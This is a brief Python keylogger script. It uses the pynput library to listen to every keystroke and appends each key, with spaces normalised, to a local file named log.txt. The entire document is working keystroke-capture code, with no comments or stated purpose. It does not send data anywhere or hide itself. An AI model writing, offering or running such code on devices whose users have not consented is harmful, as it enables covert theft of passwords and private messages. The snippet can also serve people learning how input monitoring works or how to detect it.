from pynput.keyboard import Listener


def listener_teclado(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=listener_teclado) as l:
    l.join()
